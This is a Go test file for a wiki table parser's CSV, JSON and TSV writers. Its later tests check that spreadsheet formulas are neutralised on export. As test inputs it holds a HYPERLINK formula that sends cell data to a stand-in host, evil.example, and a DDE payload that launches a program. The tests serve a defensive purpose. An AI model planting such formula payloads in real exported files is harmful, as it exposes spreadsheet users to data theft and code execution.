package parse

import (
	"bytes"
	"testing"
)

// The table's writers give exactly what `wiki table --format csv|json` prints:
// apps export datasets through them and promise the CLI's bytes. The expected
// output below was captured from the CLI before these writers existed.
const tricky = `
| date | amount | note | ok | empty | quote |
|---|---:|---|---|---|---|
| 2026-01-02 | 12.50 | coffee, "large" | true | | "Yes," she said, "no" |
| 2026-01-03 | -3 | <b>&</b> café \| pipe | false | null | 'single' |
| 2026-01-04 | 1e3 | short row |
`

func TestTableWriteCSV(t *testing.T) {
	var b bytes.Buffer
	if err := Tables(tricky)[0].WriteCSV(&b); err != nil {
		t.Fatal(err)
	}
	want := `date,amount,note,ok,empty,quote
2026-01-02,12.50,"coffee, ""large""",true,,"""Yes,"" she said, ""no"""
2026-01-03,-3,<b>&</b> café | pipe,false,null,'single'
2026-01-04,1e3,short row,,,
`
	if b.String() != want {
		t.Errorf("csv:\n%s\nwant:\n%s", b.String(), want)
	}
}

func TestTableWriteJSON(t *testing.T) {
	var b bytes.Buffer
	if err := Tables(tricky)[0].WriteJSON(&b); err != nil {
		t.Fatal(err)
	}
	want := `[
  {
    "date": "2026-01-02",
    "amount": 12.50,
    "note": "coffee, \"large\"",
    "ok": true,
    "empty": null,
    "quote": "\"Yes,\" she said, \"no\""
  },
  {
    "date": "2026-01-03",
    "amount": -3,
    "note": "\u003cb\u003e\u0026\u003c/b\u003e café | pipe",
    "ok": false,
    "empty": null,
    "quote": "single"
  },
  {
    "date": "2026-01-04",
    "amount": 1e3,
    "note": "short row",
    "ok": null,
    "empty": null,
    "quote": null
  }
]
`
	if b.String() != want {
		t.Errorf("json:\n%s\nwant:\n%s", b.String(), want)
	}
}

// A table with no rows is its header (csv) and an empty array (json).
func TestTableWritersWithNoRows(t *testing.T) {
	tb := Table{Header: []string{"a", "b"}}
	var c, j bytes.Buffer
	if err := tb.WriteCSV(&c); err != nil || c.String() != "a,b\n" {
		t.Errorf("csv = %q, %v", c.String(), err)
	}
	if err := tb.WriteJSON(&j); err != nil || j.String() != "[]\n" {
		t.Errorf("json = %q, %v", j.String(), err)
	}
}

// CSV is opened in spreadsheets, so a cell that would run as a formula gets a
// leading ' (the header too), while a plain number keeps its sign. JSON is the
// exact form and keeps every value as written.
func TestWriteCSVDisarmsFormulas(t *testing.T) {
	hyperlink := `=HYPERLINK("https://evil.example/?d="&C3,"Invoice")`
	dde := `@SUM(1+1)*cmd|' /C calc'!A0`
	tb := Table{
		Header: []string{"=name", "amount"},
		Rows: [][]string{
			{hyperlink, "-3"},
			{dde, "+1.5"},
			{"-3+A1", "-0.5e3"},
			{"=1", ".5"},
			{"+", "-"},
			{"\tcmd", "\rcmd"},
			{"plain", "1,5"},
		},
	}
	var b bytes.Buffer
	if err := tb.WriteCSV(&b); err != nil {
		t.Fatal(err)
	}
	want := "'=name,amount\n" +
		`"'=HYPERLINK(""https://evil.example/?d=""&C3,""Invoice"")",-3` + "\n" +
		`'@SUM(1+1)*cmd|' /C calc'!A0,+1.5` + "\n" +
		"'-3+A1,-0.5e3\n" +
		"'=1,.5\n" +
		"'+,'-\n" +
		"'\tcmd,\"'\rcmd\"\n" +
		"plain,\"1,5\"\n"
	if b.String() != want {
		t.Errorf("csv:\n%q\nwant:\n%q", b.String(), want)
	}

	var j bytes.Buffer
	if err := tb.WriteJSON(&j); err != nil {
		t.Fatal(err)
	}
	if !bytes.Contains(j.Bytes(), []byte(`"=name": "=HYPERLINK(`)) || bytes.Contains(j.Bytes(), []byte(`"'`)) {
		t.Errorf("json changed a value:\n%s", j.String())
	}
}

// TSV follows the same rule: it opens in a spreadsheet just as easily.
func TestWriteTSVDisarmsFormulas(t *testing.T) {
	tb := Table{Header: []string{"=name", "amount"}, Rows: [][]string{{`@SUM(1+1)*cmd|' /C calc'!A0`, "-3"}, {"a,b", "-3+A1"}}}
	var b bytes.Buffer
	if err := tb.WriteTSV(&b); err != nil {
		t.Fatal(err)
	}
	want := "'=name\tamount\n'@SUM(1+1)*cmd|' /C calc'!A0\t-3\na,b\t'-3+A1\n"
	if b.String() != want {
		t.Errorf("tsv:\n%q\nwant:\n%q", b.String(), want)
	}
}

// A byte order mark before the first header cell (a file saved by some
// editors) does not hide a formula: a spreadsheet strips it and runs the rest.
func TestWriteCSVSeesPastABOM(t *testing.T) {
	tb := Tables("| \ufeff=1+1 | b |\n|---|---|\n| ok | ok |\n")[0]
	var b bytes.Buffer
	if err := tb.WriteCSV(&b); err != nil {
		t.Fatal(err)
	}
	if want := "'\ufeff=1+1,b\nok,ok\n"; b.String() != want {
		t.Errorf("csv %q, want %q", b.String(), want)
	}
}
